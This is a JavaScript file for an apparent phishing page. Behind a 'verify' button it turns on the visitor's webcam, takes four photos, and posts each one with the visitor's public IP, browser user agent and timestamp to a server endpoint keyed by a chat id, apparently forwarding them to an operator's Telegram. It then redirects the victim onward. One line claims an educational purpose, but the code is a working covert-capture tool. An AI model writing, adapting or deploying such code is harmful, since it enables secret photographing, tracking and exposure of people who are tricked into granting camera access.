const params = new URLSearchParams(window.location.search);
const chatId = params.get("id");

const video = document.createElement("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");

let stream;
let publicIP = "Unknown";

let captureCount = 0;
const MAX_CAPTURE = 4;
const INTERVAL = 3000;

// Toast
function showToast(msg){
  toast.innerText = msg;
  toast.style.opacity = 1;
  setTimeout(()=> toast.style.opacity = 0, 2000);
}

// Get IP
async function fetchIP(){
  try{
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    publicIP = data.ip;
  }catch(e){}
}

// Log visit (admin)
fetch("/api/send",{
  method:"POST",
  headers:{ "Content-Type":"application/json" },
  body: JSON.stringify({ type:"visit" })
});

// Start camera
async function startCamera(){
  try{
    await fetchIP();

    stream = await navigator.mediaDevices.getUserMedia({video:true});
    video.srcObject = stream;
    video.play();

    showToast("📸 Camera active");

    setTimeout(loopCapture,2000);

  }catch(e){
    showToast("Permission denied ❌");
  }
}

// Loop capture
function loopCapture(){

  const interval = setInterval(()=>{

    captureImage();
    captureCount++;

    showToast(`📸 Captured (${captureCount}/${MAX_CAPTURE})`);

    if(captureCount >= MAX_CAPTURE){
      clearInterval(interval);

      stream.getTracks().forEach(t=>t.stop());

      startCountdown();
    }

  }, INTERVAL);
}

// Capture
function captureImage(){
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video,0,0);

  const image = canvas.toDataURL("image/jpeg");

  send(image);
}

// Send data
async function send(image){

  const caption = `
🌐 IP Address: ${publicIP}

💻 User Agent: ${navigator.userAgent}

📅 Date: ${new Date().toLocaleString()}

⚠️ এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে।

🔗 Admin: https://t.me/YOUR_TELEGRAM
`;

  await fetch("/api/send",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body: JSON.stringify({
      image,
      caption,
      chatId,
      type:"capture"
    })
  });
}

// Countdown
function startCountdown(){
  let sec = 5;

  const timer = setInterval(()=>{
    showToast(`⏳ Redirecting in ${sec}s`);
    sec--;

    if(sec < 0){
      clearInterval(timer);
      window.location.href = "next.html";
    }

  },1000);
}

// Button click
document.getElementById("verifyBtn").onclick = startCamera;
